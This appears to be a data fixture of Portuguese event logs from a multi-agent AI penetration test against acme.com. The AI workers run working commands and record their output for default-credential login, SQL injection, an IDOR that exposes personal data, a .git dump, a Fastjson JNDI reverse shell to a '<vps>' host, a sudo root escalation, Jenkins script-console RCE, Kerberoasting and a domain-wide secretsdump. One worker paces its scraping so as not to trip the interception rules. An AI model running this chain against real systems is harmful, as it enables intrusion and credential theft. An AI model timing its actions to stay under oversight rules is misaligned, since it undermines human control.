    intent_id: "i1",
    ts: T("2026-07-24T09:27:01Z"),
    kind: "tool_result",
    tool: "upsert_asset",
    tool_use_id: "t13",
    summary: "6 assets upserted",
  },
  {
    seq: 17,
    worker: "work#1",
    intent_id: "i1",
    ts: T("2026-07-24T09:40:00Z"),
    kind: "result",
    summary: "Reconhecimento de ativos concluído: painel admin.acme.com encontrado e devolvido ao grafo.",
    input_tokens: 96000,
    output_tokens: 6100,
    cache_read_tokens: 61000,
    cache_write_tokens: 9000,
  },

  // work#2 · i2 senha padrão do painel administrativo (done, prova g1)
  {
    seq: 20,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-07-26T03:31:00Z"),
    kind: "thinking",
    summary:
      "O painel é Element-UI e o endpoint de login não tem captcha nem limite de taxa. Primeiro a lista de senhas padrão, depois o dicionário.",
  },
  {
    seq: 21,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-07-26T03:32:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t21",
    summary: "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'",
  },
  {
    seq: 22,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-07-26T03:32:03Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t21",
    summary: "401",
    detail: "admin/admin falhou.",
  },
  {
    seq: 23,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-07-26T03:32:30Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t22",
    summary: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login",
  },
  {
    seq: 24,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-07-26T03:32:33Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t22",
    summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
    detail: "admin/admin123 entrou com sucesso; cookie de sessão obtido.",
  },
  {
    seq: 25,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-07-26T03:33:10Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t23",
    summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'",
  },
  {
    seq: 26,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-07-26T03:33:12Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t23",
    summary: "<title>Acme Admin · Console",
    detail: "Confirmado: estamos dentro do console administrativo.",
  },
  {
    seq: 27,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-07-26T03:34:00Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t24",
    summary: "report_finding(Default Credentials, high)",
  },
  {
    seq: 28,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-07-26T03:34:01Z"),
    kind: "tool_result",
    tool: "report_finding",
    tool_use_id: "t24",
    summary: "Achado f-6 registrado e ligado ao objetivo g1 (prova)",
  },
  {
    seq: 29,
    worker: "work#2",
    intent_id: "i2",
    ts: T("2026-07-26T03:50:00Z"),
    kind: "result",
    summary: "Senha padrão do painel confirmada; objetivo 1 atingido.",
    input_tokens: 72000,
    output_tokens: 4800,
    cache_read_tokens: 48000,
    cache_write_tokens: 7200,
  },

  // work#4 · i4 injeção de SQL (done)
  {
    seq: 40,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-07-25T22:01:00Z"),
    kind: "thinking",
    summary: "A página de resultados concatena q no título; começo colocando uma aspa simples à mão para ver o erro.",
  },
  {
    seq: 41,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-07-25T22:02:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t41",
    summary: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'",
  },
  {
    seq: 42,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-07-25T22:02:04Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t41",
    summary: "Unclosed quotation mark ... near '1'.",
    detail: "Indício de injeção baseada em erro no MSSQL.",
  },
  {
    seq: 43,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-07-25T22:03:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t42",
    summary: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2",
  },
  {
    seq: 44,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-07-26T01:18:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t42",
    summary:
      "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
    detail: "Injeção confirmada; 4 bancos enumerados.",
  },
  {
    seq: 45,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-07-26T01:19:00Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t43",
    summary: "report_finding(SQL Injection, high)",
  },
  {
    seq: 46,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-07-26T01:19:01Z"),
    kind: "tool_result",
    tool: "report_finding",
    tool_use_id: "t43",
    summary: "Achado f-1 registrado",
  },
  {
    seq: 47,
    worker: "work#4",
    intent_id: "i4",
    ts: T("2026-07-26T01:20:00Z"),
    kind: "result",
    summary: "Injeção de SQL confirmada.",
    input_tokens: 118000,
    output_tokens: 7400,
    cache_read_tokens: 82000,
    cache_write_tokens: 11000,
  },

  // work#5 · i5 IDOR (running)
  {
    seq: 50,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-07-26T02:31:00Z"),
    kind: "thinking",
    summary:
      "/v1/orders?id= usa id numérico sequencial, superfície clássica de IDOR. Primeiro pego o meu pedido, depois mudo o id para ver se leio o de outra pessoa.",
  },
  {
    seq: 51,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-07-26T02:40:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t51",
    summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001",
  },
  {
    seq: 52,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-07-26T02:40:02Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t51",
    summary: '{ "order_id":1001, "user_id":42, "amount":299 }',
    detail: "Pedido do próprio usuário; normal.",
  },
  {
    seq: 53,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-07-26T02:43:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t52",
    summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002",
  },
  {
    seq: 54,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-07-26T02:43:02Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t52",
    summary:
      '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"(11) 9****-6021", "address":"Av. Paulista, 1000 — São Paulo ****" }',
    detail: "Leitura indevida do pedido de outra pessoa (com telefone e endereço); não há verificação de propriedade.",
  },
  {
    seq: 55,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-07-26T02:44:00Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t53",
    summary: "report_finding(IDOR, high)",
  },
  {
    seq: 56,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-07-26T02:44:01Z"),
    kind: "tool_result",
    tool: "report_finding",
    tool_use_id: "t53",
    summary: "Achado f-2 registrado",
  },
  {
    seq: 57,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-07-26T03:58:10Z"),
    kind: "thinking",
    summary:
      "Percorrendo a faixa de ids para medir o volume de dados acessíveis indevidamente (sem exportar por ora, para não disparar as regras de interceptação).",
  },

  // work#3 · i3 enumeração da API de usuários do painel administrativo (running)
  {
    seq: 60,
    worker: "work#3",
    intent_id: "i3",
    ts: T("2026-07-26T03:56:00Z"),
    kind: "thinking",
    summary:
      "Com a sessão do painel em mãos, enumero os endpoints administrativos atrás de um ponto de exportação em massa de dados sensíveis (objetivo 2).",
  },
  {
    seq: 61,
    worker: "work#3",
    intent_id: "i3",
    ts: T("2026-07-26T03:57:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t61",
    summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1",
  },
  {
    seq: 62,
    worker: "work#3",
    intent_id: "i3",
    ts: T("2026-07-26T03:57:02Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t61",
    summary: '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
    detail:
      "O endpoint administrativo devolve todos os usuários paginados (com e-mail e telefone), cerca de 12,8 mil registros.",
  },
  {
    seq: 63,
    worker: "work#3",
    intent_id: "i3",
    ts: T("2026-07-26T03:58:20Z"),
    kind: "thinking",
    summary:
      "Confirmado um ponto de leitura em massa de dados de usuários; a exportação casou com as regras de ação destrutiva e exfiltração, então foi enviada para aprovação e aguarda liberação.",
  },

  // workG · ig vazamento de código-fonte .git e credenciais hardcoded (done)
  {
    seq: 310,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-07-25T20:26:00Z"),
    kind: "thinking",
    summary:
      "O robots.txt cita /.git. Primeiro testo se o diretório é baixável: com o código em mãos, dá para caçar pontos de injeção e segredos fixos em caixa-branca.",
  },
  {
    seq: 311,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-07-25T20:27:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "tg1",
    summary: "curl -s -o /dev/null -w '%{http_code}' https://www.acme.com/.git/HEAD",
  },
  {
    seq: 312,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-07-25T20:27:02Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "tg1",
    summary: "200",
    detail: "O diretório .git está acessível publicamente.",
  },
  {
    seq: 313,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-07-25T20:28:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "tg2",
    summary: "git-dumper https://www.acme.com/.git/ /tmp/acme && git -C /tmp/acme log --oneline | head",
  },
  {
    seq: 314,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-07-25T20:30:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "tg2",
    summary: "214 arquivos reconstruídos; HEAD=main. config.php e db.php estão entre eles.",
    detail: "Código-fonte completo do backend reconstruído em /tmp/acme.",
  },
  {
    seq: 315,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-07-25T20:34:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "tg3",
    summary: "grep -rniE 'password|pwd|secret|Data Source' /tmp/acme/config.php",
  },
  {
    seq: 316,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-07-25T20:34:03Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "tg3",
    summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
    detail:
      "Senha de banco fixa no código, com host apontando para um IP interno — registrada como credencial provavelmente reutilizada na rede interna.",
  },
  {
    seq: 317,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-07-25T20:36:00Z"),
    kind: "result",
    summary:
      "Vazamento de código e credencial de banco fixa confirmados; credencial registrada no grafo para reuso interno adiante.",
    input_tokens: 88000,
    output_tokens: 5200,
    cache_read_tokens: 60000,
    cache_write_tokens: 8000,
  },

  // work#6 · i6 fingerprint do shop e associação com CVEs (done)
  {
    seq: 320,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-07-25T14:22:00Z"),
    kind: "thinking",
    summary:
      "shop.acme.com é um e-commerce próprio: primeiro identifico as versões de framework e componentes, depois ataco os que têm desserialização conhecida.",
  },
  {
    seq: 321,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-07-25T14:24:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t6a",
    summary: "curl -si https://shop.acme.com/ | grep -iE 'x-powered-by|server|jsessionid'",
  },
  {
    seq: 322,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-07-25T14:24:03Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t6a",
    summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
    detail: "Pilha Java, com /api/import aceitando corpo JSON.",
  },
  {
    seq: 323,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-07-25T14:30:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t6b",
    summary:
      'curl -s -H \'Content-Type: application/json\' -d \'{"a":{"@type":"java.lang.AutoCloseable"}}\' https://shop.acme.com/api/import',
  },
  {
    seq: 324,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-07-25T14:31:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t6b",
    summary: "A pilha de erro traz com.alibaba.fastjson.JSONException (1.2.24)",
    detail: "Fastjson 1.2.24 confirmado — corresponde ao RCE por injeção JNDI via JdbcRowSetImpl.",
  },
  {
    seq: 325,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-07-25T14:40:00Z"),
    kind: "result",
    summary:
      "Impressão digital casou com Fastjson 1.2.24: a superfície de RCE por desserialização se confirma e passa para a intenção de exploração.",
    input_tokens: 64000,
    output_tokens: 4100,
    cache_read_tokens: 42000,
    cache_write_tokens: 6000,
  },

  // work#7 · i7 RCE por desserialização obtendo reverse shell (done, prova g3)
  {
    seq: 330,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-07-25T15:12:00Z"),
    kind: "thinking",
    summary:
      "Subo um serviço JNDI/LDAP malicioso para a loja conectar de volta e carregar o payload: primeiro confirmo a saída pelo dnslog, depois estabeleço o shell reverso.",
  },
  {
    seq: 331,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-07-25T15:15:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t7a",
    summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # sobe o serviço LDAP/HTTP malicioso",
  },
  {
    seq: 332,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-07-25T15:16:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t7a",
    summary: "LDAP Server started on 1389, HTTP on 8180",
    detail: "Serviço malicioso pronto.",
  },
  {
    seq: 333,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-07-25T15:20:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t7b",
    summary:
      'curl -s -H \'Content-Type: application/json\' -d \'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444","autoCommit":true}\' https://shop.acme.com/api/import',
  },
  {
    seq: 334,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-07-25T15:21:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t7b",
    summary: "O LDAP recebeu a requisição → carregou o ReverseShell → o nc em escuta recebeu a conexão",
    detail: "Payload disparado com sucesso.",
  },
  {
    seq: 335,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-07-25T15:24:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t7c",
    summary: "id; hostname -I  # confirmar identidade e faixa de rede dentro do shell reverso",
  },
  {
    seq: 336,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-07-25T15:24:02Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t7c",
    summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
    detail: "www-data@dmz-web01, com segunda placa em 10.10.10.x — estamos na DMZ e colados na rede interna.",
  },
  {
    seq: 337,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-07-25T15:30:00Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t7d",
    summary: "report_finding(Deserialization RCE, high)",
  },
  {
    seq: 338,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-07-25T15:40:00Z"),
    kind: "result",
    summary:
      "O RCE por desserialização rendeu um shell reverso como www-data; o ponto de apoio do objetivo 3 está estabelecido.",
    input_tokens: 132000,
    output_tokens: 8600,
    cache_read_tokens: 90000,
    cache_write_tokens: 12000,
  },

  // work#8 · i8 escalonamento de privilégios no ponto de apoio (done)
  {
    seq: 340,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-07-25T16:02:00Z"),
    kind: "thinking",
    summary:
      "www-data tem permissões limitadas: faço coleta local atrás de um vetor de elevação — configuração do sudo, binários SUID e versão do kernel.",
  },
  {
    seq: 341,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-07-25T16:05:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t8a",
    summary: "sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head",
  },
  {
    seq: 342,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-07-25T16:05:03Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t8a",
    summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3",
    detail: "O python3 está na lista do sudo e sem senha — dá para elevar direto.",
  },
  {
    seq: 343,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-07-25T16:10:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t8b",
    summary: "sudo python3 -c 'import os;os.setuid(0);os.system(\"id\")'",
  },
  {
    seq: 344,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-07-25T16:10:02Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t8b",
    summary: "uid=0(root) gid=0(root) groups=0(root)",
    detail: "Elevado a root.",
  },
  {
    seq: 345,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-07-25T16:14:00Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t8c",
    summary: "report_finding(Privilege Escalation, high)",
  },
  {
    seq: 346,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-07-25T16:20:00Z"),
    kind: "result",
    summary: "Elevação local a root concluída e ponto de apoio firme; pronto para usá-lo como pivô na rede interna.",
    input_tokens: 74000,
    output_tokens: 4700,
    cache_read_tokens: 50000,
    cache_write_tokens: 7000,
  },

  // work#9 · i9 descoberta de hosts da rede interna (done)
  {
    seq: 350,
    worker: "work#9",
    intent_id: "i9",
    ts: T("2026-07-25T20:32:00Z"),
    kind: "thinking",
    summary:
      "O ponto de apoio alcança 10.10.10.0/24 direto: uso fscan e varredura interna para descobrir hosts e portas e delimitar o controlador de domínio e os alvos de alto valor.",
  },
  {
    seq: 351,
    worker: "work#9",
    intent_id: "i9",
    ts: T("2026-07-25T20:36:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t9a",
    summary: "./fscan -h 10.10.10.0/24 -np -nobr 2>&1 | tail -n 30",
  },
  {
    seq: 352,
    worker: "work#9",
    intent_id: "i9",
    ts: T("2026-07-25T20:55:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t9a",
    summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
    detail: "Delimitados o controlador de domínio DC01, o servidor de arquivos FS01 e o Jenkins interno.",
  },
  {
    seq: 353,
    worker: "work#9",
    intent_id: "i9",
    ts: T("2026-07-25T21:00:00Z"),
    kind: "result",
    summary: "Descoberta de hosts internos concluída; 3 alvos de alto valor registrados no grafo.",
    input_tokens: 82000,
    output_tokens: 5100,
    cache_read_tokens: 56000,
    cache_write_tokens: 8000,
  },

  // work#10 · i10 reutilização de credenciais na rede interna (running)
  {
    seq: 360,
    worker: "work#10",
    intent_id: "i10",
    ts: T("2026-07-26T03:42:00Z"),
    kind: "thinking",
    summary:
      "O sa/Acme@2021 vazado no código é a senha do banco, e reuso de senha é comum nas empresas. Faço password spraying contra DC01, FS01 e JENKINS.",
  },
  {
    seq: 361,
    worker: "work#10",
    intent_id: "i10",
    ts: T("2026-07-26T03:44:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t10a",
    summary: "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Acme@2021'",
  },
  {
    seq: 362,
    worker: "work#10",
    intent_id: "i10",
    ts: T("2026-07-26T03:44:10Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t10a",
    summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] falha de autenticação",
    detail:
      "No FS01 a senha de sa foi reutilizada com sucesso e tem privilégio de administrador; no DC01 não funciona.",
  },
  {
    seq: 363,
    worker: "work#10",
    intent_id: "i10",
    ts: T("2026-07-26T03:50:00Z"),
    kind: "thinking",
    summary: "FS01 dominado; enumerando os compartilhamentos atrás de mais credenciais e arquivos sensíveis…",
  },

  // work#11 · i11 RCE sem autenticação no Jenkins (done)
  {
    seq: 370,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-07-25T21:32:00Z"),
    kind: "thinking",
    summary: "A porta 8080 do JENKINS está acessível direto; começo vendo se o console /script exige autenticação.",
  },
  {
    seq: 371,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-07-25T21:35:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t11a",
    summary: "curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'",
  },
  {
    seq: 372,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-07-25T21:35:02Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t11a",
    summary: "200",
    detail: "O Script Console é acessível sem login.",
  },
  {
    seq: 373,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-07-25T21:40:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t11b",
    summary: "curl -s -d 'script=println+\"whoami\".execute().text' http://10.10.10.20:8080/scriptText",
  },
  {
    seq: 374,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-07-25T21:40:03Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t11b",
    summary: "nt authority\\system",
    detail: "O Groovy executa com privilégio SYSTEM.",
  },
  {
    seq: 375,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-07-25T21:44:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t11c",
    summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # exporta o cofre de credenciais do Jenkins",
  },
  {
    seq: 376,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-07-25T21:45:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t11c",
    summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
    detail: "Senhas em texto claro de duas contas de serviço do domínio exportadas.",
  },
  {
    seq: 377,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-07-25T21:48:00Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t11d",
    summary: "report_finding(Unauthenticated RCE, high)",
  },
  {
    seq: 378,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-07-25T21:50:00Z"),
    kind: "result",
    summary:
      "RCE sem autenticação no Jenkins confirmado, com exportação das credenciais de duas contas de serviço do domínio.",
    input_tokens: 96000,
    output_tokens: 6200,
    cache_read_tokens: 64000,
    cache_write_tokens: 9500,
  },

  // work#12 · i12 Kerberoasting (done)
  {
    seq: 380,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-07-25T22:42:00Z"),
    kind: "thinking",
    summary:
      "Autentico no domínio com a credencial svc_deploy e uso GetUserSPNs para pedir o TGS das contas de serviço vulneráveis a Kerberoast.",
  },
  {
    seq: 381,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-07-25T22:50:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t12a",
    summary: "impacket-GetUserSPNs acme.local/svc_deploy:'Deploy@Acme2024' -dc-ip 10.10.10.10 -request",
  },
  {
    seq: 382,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-07-25T22:52:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t12a",
    summary: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...",
    detail: "Tíquete TGS de svc_sql obtido (Kerberos RC4).",
  },
  {
    seq: 383,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-07-25T23:10:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t12b",
    summary: "hashcat -m 13100 tgs.hash rockyou.txt --force",
  },
  {
    seq: 384,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-07-25T23:18:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t12b",
    summary: "$krb5tgs$23$*svc_sql$...:Sql@2020",
    detail: "Senha Sql@2020 quebrada em 8 minutos.",
  },
  {
    seq: 385,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-07-25T23:19:00Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t12c",
    summary: "report_finding(Kerberoasting, high)",
  },
  {
    seq: 386,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-07-25T23:20:00Z"),
    kind: "result",
    summary: "Kerberoasting quebrou a senha de svc_sql; registrada no grafo para o ataque ao controlador de domínio.",
    input_tokens: 108000,
    output_tokens: 6800,
    cache_read_tokens: 72000,
    cache_write_tokens: 10000,
  },

  // work#13 · i13 tomada do controlador de domínio DC01 (done, prova g4)
  {
    seq: 390,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-07-25T23:52:00Z"),
    kind: "thinking",
    summary:
      "svc_deploy veio do cofre do Jenkins: primeiro confiro a quais grupos pertence — se estiver em Domain Admins, dá para ir direto de psexec no DC01.",
  },
  {
    seq: 391,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-07-25T23:55:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t13a",
    summary: "net rpc group members 'Domain Admins' -U 'acme.local/svc_deploy%Deploy@Acme2024' -S 10.10.10.10",
  },
  {
    seq: 392,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-07-25T23:55:05Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t13a",
    summary: "ACME\\Administrator\nACME\\svc_deploy",
    detail: "svc_deploy é membro de Domain Admins.",
  },
  {
    seq: 393,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-07-26T00:00:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t13b",
    summary: "impacket-psexec acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10",
  },
  {
    seq: 394,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-07-26T00:00:10Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t13b",
    summary: "C:\\Windows\\system32> whoami\nnt authority\\system",
    detail: "Acesso ao controlador de domínio DC01 como SYSTEM.",
  },
  {
    seq: 395,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-07-26T00:05:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t13c",
    summary: "impacket-secretsdump acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10 -just-dc",
  },
  {
    seq: 396,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-07-26T00:10:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t13c",
    summary: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::",
    detail:
      "Hashes NTLM de todo o domínio exportados (incluindo krbtgt), permitindo um golden ticket para controle persistente.",
  },
  {
    seq: 397,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-07-26T00:15:00Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t13d",
    summary: "report_finding(Domain Compromise, high)",
  },
  {
    seq: 398,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-07-26T00:20:00Z"),
    kind: "result",
    summary: "Controlador de domínio DC01 dominado; o secretsdump exportou os hashes de todo o domínio. Alvo atingido.",
    input_tokens: 144000,
    output_tokens: 9200,
    cache_read_tokens: 96000,
    cache_write_tokens: 14000,
  },

  // agent principal (conversa com humano no loop)
  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "Por onde começar no painel?" },
  {
    seq: 71,
    worker: "mainagent",
    ts: T("2026-07-26T03:18:06Z"),
    kind: "text",
    summary:
      "admin.acme.com é um painel Element-UI, sem captcha e sem limite de taxa. Sugiro começar pela lista de senhas padrão (admin/admin123) e só depois partir para o dicionário. Já injetei uma intenção de alta prioridade para o work agent.",
  },
  {
    seq: 72,
    worker: "mainagent",
    ts: T("2026-07-26T03:52:00Z"),
    kind: "user",
    summary: "Entramos no painel. Qual o foco agora?",
  },
  {
    seq: 73,
    worker: "mainagent",
    ts: T("2026-07-26T03:52:08Z"),
    kind: "text",
    summary:
      "O objetivo 2 é ler dados sensíveis de usuários: toco em paralelo a enumeração dos endpoints de usuário do painel e o IDOR da API. Atenção: a exportação em massa dispara as regras de interceptação e vai precisar da sua aprovação.",
  },
  {
    seq: 400,
    worker: "mainagent",
    ts: T("2026-07-25T15:42:00Z"),
    kind: "user",
    summary: "Consegui o shell. Qual o próximo passo?",
  },
  {
    seq: 401,
    worker: "mainagent",
    ts: T("2026-07-25T15:42:10Z"),
    kind: "text",
    summary:
      "www-data não tem permissão suficiente: primeiro a elevação (o sudo -l parece promissor). Com root, use a DMZ como trampolim para descobrir a rede interna, priorizando o controlador de domínio e o Jenkins.",
  },
  {
    seq: 402,
    worker: "mainagent",
    ts: T("2026-07-25T21:22:00Z"),
    kind: "user",
    summary: "Terminei a varredura interna. Aquele Jenkins parece estar sem autenticação?",
  },
